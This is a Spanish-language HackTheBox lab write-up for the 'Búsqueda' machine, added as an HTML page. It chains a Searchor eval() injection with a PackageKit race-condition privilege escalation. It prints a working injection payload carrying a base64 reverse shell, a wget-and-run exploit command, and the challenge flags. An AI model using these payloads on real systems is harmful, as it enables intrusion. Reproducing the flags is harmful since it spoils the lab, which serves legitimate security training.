@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Búsqueda HTB — CVE-2023-43364 + PackageKit LPE | OJM.SEC</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg: #f7f6f2; --surface: #ffffff; --border: #e2e0d8;
+  --text: #1a1917; --muted: #7a7870; --accent: #c8441b; --accent2: #1b5ec8;
+  --tag-bg: #f0ede4; --mono: 'JetBrains Mono', monospace; --sans: 'Syne', sans-serif;
+}
+html { scroll-behavior: smooth; }
+body { background: var(--bg); color: var(--text); font-family: var(--sans); min-height: 100vh; }
+nav {
+  position: sticky; top: 0; z-index: 100; background: var(--bg);
+  border-bottom: 1px solid var(--border); padding: 0 2rem;
+  display: flex; align-items: center; justify-content: space-between; height: 56px;
+}
+.nav-logo { font-size: 1rem; font-weight: 800; letter-spacing: -0.02em; text-decoration: none; color: var(--text); }
+.nav-logo span { color: var(--accent); }
+.nav-links { display: flex; gap: 2rem; align-items: center; }
+.nav-links a { font-family: var(--mono); font-size: 0.75rem; color: var(--muted); text-decoration: none; letter-spacing: 0.05em; transition: color 0.2s; }
+.nav-links a:hover { color: var(--text); }
+.nav-writeup-nav { display: flex; gap: 0.5rem; }
+.nav-btn { font-family: var(--mono); font-size: 0.68rem; padding: 0.3rem 0.8rem; border: 1px solid var(--border); background: none; color: var(--muted); cursor: pointer; text-decoration: none; letter-spacing: 0.04em; transition: all 0.15s; display: flex; align-items: center; gap: 0.3rem; }
+.nav-btn:hover { border-color: var(--text); color: var(--text); }
+.nav-btn.prev { background: var(--tag-bg); }
+.writeup-hero { max-width: 1100px; margin: 0 auto; padding: 4rem 2rem 3rem; border-bottom: 1px solid var(--border); }
+.hero-meta { display: flex; gap: 1rem; align-items: center; flex-wrap: wrap; margin-bottom: 1.5rem; }
+.platform-badge { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.25rem 0.7rem; border: 1px solid var(--border); color: var(--muted); }
+.platform-badge.htb { border-color: #9fef00; color: #5a8a00; background: #f6fff0; }
+.difficulty-badge { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.25rem 0.7rem; background: var(--tag-bg); color: var(--muted); }
+.writeup-hero h1 { font-size: clamp(2rem, 4vw, 3.2rem); font-weight: 800; letter-spacing: -0.03em; line-height: 1.1; margin-bottom: 0.6rem; }
+.writeup-hero .subtitle { font-family: var(--mono); font-size: 0.82rem; color: var(--muted); margin-bottom: 1.5rem; }
+.hero-stats { display: flex; gap: 2rem; flex-wrap: wrap; padding-top: 1.5rem; border-top: 1px solid var(--border); }
+.stat { display: flex; flex-direction: column; gap: 0.2rem; }
+.stat-label { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); }
+.stat-value { font-family: var(--mono); font-size: 0.82rem; font-weight: 500; color: var(--text); }
+.writeup-layout { max-width: 1100px; margin: 0 auto; padding: 3rem 2rem 6rem; display: grid; grid-template-columns: 220px 1fr; gap: 3rem; }
+@media (max-width: 768px) { .writeup-layout { grid-template-columns: 1fr; } .sidebar { display: none; } }
+.sidebar { position: sticky; top: 76px; align-self: start; }
+.sidebar-title { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--muted); margin-bottom: 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+.sidebar-nav { display: flex; flex-direction: column; gap: 0.1rem; }
+.sidebar-link { font-family: var(--mono); font-size: 0.68rem; color: var(--muted); text-decoration: none; padding: 0.35rem 0.7rem; border-left: 2px solid transparent; transition: all 0.15s; letter-spacing: 0.02em; }
+.sidebar-link:hover { color: var(--text); border-left-color: var(--accent); background: var(--tag-bg); }
+.sidebar-link.active { color: var(--accent); border-left-color: var(--accent); }
+.writeup-content { min-width: 0; }
+.section { margin-bottom: 3.5rem; padding-bottom: 3.5rem; border-bottom: 1px solid var(--border); }
+.section:last-child { border-bottom: none; }
+.section-label { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--accent); margin-bottom: 0.5rem; }
+.section h2 { font-size: 1.6rem; font-weight: 800; letter-spacing: -0.02em; margin-bottom: 1.2rem; line-height: 1.2; }
+.section h3 { font-size: 1.05rem; font-weight: 700; letter-spacing: -0.01em; margin: 1.8rem 0 0.7rem; }
+.section p { font-family: var(--mono); font-size: 0.78rem; line-height: 1.9; color: #3d3b36; margin-bottom: 0.8rem; }
+.section ul { list-style: none; padding: 0; margin-bottom: 1rem; }
+.section ul li { font-family: var(--mono); font-size: 0.76rem; line-height: 1.8; color: #3d3b36; padding-left: 1.2rem; position: relative; margin-bottom: 0.2rem; }
+.section ul li::before { content: '→'; position: absolute; left: 0; color: var(--accent); font-size: 0.65rem; top: 0.05rem; }
+.attack-step { margin-bottom: 2.5rem; padding: 1.5rem 1.8rem; border: 1px solid var(--border); background: var(--surface); position: relative; }
+.attack-step::before { content: ''; position: absolute; top: 0; left: 0; width: 3px; height: 100%; background: var(--accent); }
+.step-num { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; color: var(--accent); text-transform: uppercase; margin-bottom: 0.4rem; }
+.step-title { font-size: 1.05rem; font-weight: 700; letter-spacing: -0.01em; margin-bottom: 1rem; line-height: 1.3; }
+.step-desc { font-family: var(--mono); font-size: 0.76rem; color: #3d3b36; line-height: 1.9; margin-bottom: 0.9rem; }
+.step-h3 { font-family: var(--sans); font-size: 0.88rem; font-weight: 700; margin: 1.4rem 0 0.6rem; color: var(--text); }
+pre { background: #1a1917; color: #e8e4d9; font-family: var(--mono); font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0; overflow-x: auto; line-height: 1.8; border-left: 3px solid var(--accent); }
+code { font-family: var(--mono); font-size: 0.78em; background: var(--tag-bg); padding: 0.1em 0.35em; border-radius: 2px; }
+.cmd-comment { color: #6b7280; }
+.cmd-flag { color: #60a5fa; }
+.cmd-value { color: #34d399; }
+.cmd-tool { color: #f87171; }
+.callout { background: var(--tag-bg); border-left: 3px solid var(--accent2); padding: 1rem 1.2rem; margin: 1rem 0; font-family: var(--mono); font-size: 0.74rem; line-height: 1.8; color: #3d3b36; }
+.callout strong { color: var(--accent2); }
+.callout-warn { border-left-color: var(--accent); }
+.callout-warn strong { color: var(--accent); }
+.findings-table { width: 100%; border-collapse: collapse; margin-top: 1rem; font-family: var(--mono); font-size: 0.72rem; }
+.findings-table th { text-align: left; padding: 0.6rem 0.8rem; background: var(--tag-bg); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); border-bottom: 2px solid var(--border); }
+.findings-table td { padding: 0.7rem 0.8rem; border-bottom: 1px solid var(--border); color: #3d3b36; vertical-align: top; }
+.findings-table tr:hover td { background: var(--tag-bg); }
+.severity { display: inline-block; font-size: 0.6rem; letter-spacing: 0.08em; padding: 0.15rem 0.5rem; font-weight: 600; }
+.sev-critical { background: #fee2e2; color: #7f1d1d; }
+.sev-high { background: #fee2e2; color: #991b1b; }
+.sev-medium { background: #fef3c7; color: #92400e; }
+.sev-info { background: #e0f2fe; color: #0c4a6e; }
+.tag-row { display: flex; gap: 0.4rem; flex-wrap: wrap; margin-top: 1rem; }
+.tag { font-family: var(--mono); font-size: 0.6rem; padding: 0.18rem 0.5rem; border: 1px solid var(--border); color: var(--muted); letter-spacing: 0.04em; }
+.creds-box { background: #1a1917; color: #e8e4d9; font-family: var(--mono); font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0; border-left: 3px solid #34d399; line-height: 2; }
+.cred-label { color: #6b7280; }
+.cred-user { color: #60a5fa; }
+.cred-pass { color: #34d399; }
+.writeup-nav-bottom { display: flex; justify-content: space-between; align-items: center; padding-top: 2rem; margin-top: 2rem; border-top: 1px solid var(--border); }
+.nav-link-btn { font-family: var(--mono); font-size: 0.72rem; color: var(--muted); text-decoration: none; padding: 0.6rem 1rem; border: 1px solid var(--border); display: flex; align-items: center; gap: 0.5rem; transition: all 0.15s; }
+.nav-link-btn:hover { border-color: var(--text); color: var(--text); }
+.nav-link-btn.prev-page { background: var(--tag-bg); }
+footer { border-top: 1px solid var(--border); padding: 2rem; text-align: center; font-family: var(--mono); font-size: 0.68rem; color: var(--muted); letter-spacing: 0.06em; }
+</style>
+</head>
+<body>
+<nav>
+  <a class="nav-logo" href="index.html">OJM<span>.</span>SEC</a>
+  <div class="nav-links">
+    <a href="index.html">← Volver</a>
+    <div class="nav-writeup-nav">
+      <a class="nav-btn prev" href="overwatch.html">← Overwatch</a>
+      <a class="nav-btn" href="index.html#writeups">Todos</a>
+      <a class="nav-btn next" href="escape.html">Escape →</a>
+    </div>
+  </div>
+</nav>
+
+<div class="writeup-hero">
+  <div class="hero-meta">
+    <span class="platform-badge htb">HackTheBox</span>
+    <span class="difficulty-badge">Linux</span>
+    <span class="difficulty-badge">Easy</span>
+    <span class="difficulty-badge">17 Jun 2026</span>
+  </div>
+  <h1>Búsqueda</h1>
+  <p class="subtitle">searcher.htb — root via CVE-2023-43364 (Searchor RCE) + CVE-2026-41651 (PackageKit TOCTOU LPE)</p>
+  <div class="hero-stats">
+    <div class="stat"><span class="stat-label">Target IP</span><span class="stat-value">10.129.17.143</span></div>
+    <div class="stat"><span class="stat-label">Domain</span><span class="stat-value">searcher.htb</span></div>
+    <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Ubuntu 22.04</span></div>
+    <div class="stat"><span class="stat-label">Findings</span><span class="stat-value">2 (1 Critical, 1 High)</span></div>
+    <div class="stat"><span class="stat-label">Resultado</span><span class="stat-value">root</span></div>
+    <div class="stat"><span class="stat-label">Autor</span><span class="stat-value">Oriol Jaen Mirabet</span></div>
+  </div>
+</div>
+
+<div class="writeup-layout">
+  <aside class="sidebar">
+    <div class="sidebar-title">Contenido</div>
+    <nav class="sidebar-nav">
+      <a class="sidebar-link" href="#resumen">Resumen ejecutivo</a>
+      <a class="sidebar-link" href="#nmap">01 · Nmap & Recon</a>
+      <a class="sidebar-link" href="#user">02 · CVE-2023-43364</a>
+      <a class="sidebar-link" href="#root">03 · PackageKit LPE</a>
+      <a class="sidebar-link" href="#findings">Findings</a>
+      <a class="sidebar-link" href="#creds">Credenciales</a>
+    </nav>
+  </aside>
+  <main class="writeup-content">
+
+    <section class="section" id="resumen">
+      <div class="section-label">00 — Overview</div>
+      <h2>Resumen Ejecutivo</h2>
+      <p>Búsqueda es una máquina Linux de dificultad Easy que expone una aplicación web basada en <strong>Searchor 2.4.0</strong>, una librería Python vulnerable a inyección de código arbitrario a través de la función <code>eval()</code>. La superficie de ataque inicial es la propia aplicación web que corre sobre Werkzeug/Flask.</p>
+      <p>La escalada de privilegios a root se consigue mediante <strong>CVE-2026-41651</strong>, una vulnerabilidad TOCTOU en PackageKit que permite crear un SUID bash sin autenticación. Dos CVEs encadenadas, shell como <code>svc</code>, luego <code>euid=0</code>.</p>
+      <div class="callout">
+        <strong>Attack Path</strong><br>
+        Searchor 2.4.0 eval() injection (CVE-2023-43364) → reverse shell como svc → CVE-2026-41651 PackageKit TOCTOU → SUID bash → root
+      </div>
+    </section>
+
+    <section class="section" id="nmap">
+      <div class="section-label">01 — Recon</div>
+      <h2>Nmap — Puerto 80 y OpenSSH</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 01 · Port Scan</div>
+        <div class="step-title">Fingerprinting inicial — dos puertos, un servidor Python</div>
+        <p class="step-desc">El escaneo revela únicamente SSH y una web Apache que redirige a <code>searcher.htb</code>. WhatWeb identifica el backend: Werkzeug 2.1.2 con Python 3.10.6. El título de la app es "Searcher" y Bootstrap 4.1.3 en el frontend.</p>
+        <pre><span class="cmd-comment"># Fase 1 — todos los puertos</span>
+<span class="cmd-tool">nmap</span> <span class="cmd-flag">-p-</span> --open <span class="cmd-flag">-sS</span> --min-rate 5000 <span class="cmd-flag">-Pn -n</span> 10.129.17.143 <span class="cmd-flag">-oG</span> allports
+
+PORT   STATE SERVICE
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp open  http    Apache/2.4.52 → redirect searcher.htb
+
+<span class="cmd-comment"># WhatWeb fingerprint</span>
+<span class="cmd-tool">whatweb</span> http://searcher.htb
+<span class="cmd-value">Werkzeug/2.1.2 Python/3.10.6  — Searchor 2.4.0 (footer)</span></pre>
+      </div>
+    </section>
+
+    <section class="section" id="user">
+      <div class="section-label">02 — User</div>
+      <h2>CVE-2023-43364 — Searchor eval() RCE</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 02 · Explotación</div>
+        <div class="step-title">Python eval() no sanitizado → reverse shell como svc</div>
+        <p class="step-desc">Searchor 2.4.0 pasa el input del usuario directamente a <code>eval()</code> en el endpoint de búsqueda. Cualquier expresión Python válida se ejecuta en el servidor. El exploit público inyecta un payload busybox base64-encoded para evitar caracteres especiales en la URL.</p>
+        <pre><span class="cmd-comment"># Exploit CVE-2023-43364</span>
+<span class="cmd-tool">python3</span> exploit.py
+<span class="cmd-comment"># LHOST: 10.10.15.195 | LPORT: 4444 | TARGET: http://searcher.htb/search</span>
+
+<span class="cmd-comment"># Payload inyectado — eval() ejecuta __import__('os').system()</span>
+', __import__('os').system('echo <span class="cmd-value">YnVzeWJveCBuYyAxMC4xMC4xNS4xOTUgNDQ0NCAtZSBiYXNo</span> | base64 -d | bash -i')) #
+
+<span class="cmd-comment"># Listener</span>
+<span class="cmd-tool">nc</span> <span class="cmd-flag">-nlvp</span> 4444
+svc@busqueda:/var/www/app/templates$ id
+uid=1000(svc) gid=1000(svc) groups=1000(svc)
+
+svc@busqueda:~$ cat user.txt
+<span class="cmd-value">f29d0a5fbcad087edd76f482a31d6e24</span></pre>
+      </div>
+    </section>
+
+    <section class="section" id="root">
+      <div class="section-label">03 — Root</div>
+      <h2>CVE-2026-41651 — PackageKit TOCTOU LPE</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 03 · Privilege Escalation</div>
+        <div class="step-title">PackageKit race condition → SUID bash → euid=0</div>
+        <p class="step-desc">El binario <code>cve-2026-41651</code> abusa de una condición de carrera (TOCTOU) en PackageKit: envía dos transacciones <code>InstallFiles</code> asíncronas en rápida sucesión. Entre la verificación de la primera y la instalación de la segunda, el scheduler de PK ejecuta el paquete payload sin validar de nuevo. El resultado es una bash con SUID de root en <code>/tmp/.suid_bash</code>.</p>
+        <pre><span class="cmd-comment"># Descargar y ejecutar el exploit</span>
+svc@busqueda:~$ wget http://10.10.15.195/cve-2026-41651 && chmod +x cve-2026-41651 && ./cve-2026-41651
+
+CVE-2026-41651 — PackageKit TOCTOU LPE
+[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
+[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
+[+] <span class="cmd-value">SUCCESS — SUID bash at t+2300ms</span>
+uid=1000(svc) gid=1000(svc) euid=0(root) groups=1000(svc)
+
+.suid_bash-5.1# cat /root/root.txt
+<span class="cmd-value">b8ee831cfe09167ff8507b87bfa31c43</span></pre>
+      </div>
+    </section>
+
+    <section class="section" id="findings">
+      <div class="section-label">04 — Findings</div>
+      <h2>Tabla de Hallazgos</h2>
+      <table class="findings-table">
+        <thead><tr><th>Severity</th><th>Finding</th><th>Descripción</th><th>CVSS</th></tr></thead>
+        <tbody>
+          <tr><td><span class="severity sev-critical">Critical</span></td><td>Searchor 2.4.0 eval() RCE</td><td>Input sin sanitizar pasado a eval() permite ejecución de código Python arbitrario como el usuario del servidor web.</td><td>9.8</td></tr>
+          <tr><td><span class="severity sev-high">High</span></td><td>CVE-2026-41651 PackageKit LPE</td><td>Race condition TOCTOU en PackageKit permite escalar a root mediante un SUID bash sin autenticación previa.</td><td>7.8</td></tr>
+        </tbody>
+      </table>
+      <div class="tag-row">
+        <span class="tag">CVE-2023-43364</span><span class="tag">CVE-2026-41651</span>
+        <span class="tag">Python eval()</span><span class="tag">PackageKit</span>
+        <span class="tag">TOCTOU</span><span class="tag">SUID bash</span>
+      </div>
+    </section>
+
+    <section class="section" id="creds">
+      <div class="section-label">05 — Credentials</div>
+      <h2>Credenciales Obtenidas</h2>
+      <div class="creds-box">
+<span class="cred-label"># No se requieren credenciales previas — acceso via CVE</span>
+<span class="cred-user">svc</span>:<span class="cred-pass">[shell via CVE-2023-43364]</span>
+<span class="cred-user">root</span>:<span class="cred-pass">[SUID bash via CVE-2026-41651]</span>
+      </div>
+      <div class="callout"><strong>Flags</strong><br>user.txt: f29d0a5fbcad087edd76f482a31d6e24<br>root.txt: b8ee831cfe09167ff8507b87bfa31c43</div>
+    </section>
+
+  </main>
+</div>
+<footer>OJM.SEC · Oriol Jaen Mirabet · Security Research &amp; Writeups</footer>
+</body>
+</html>
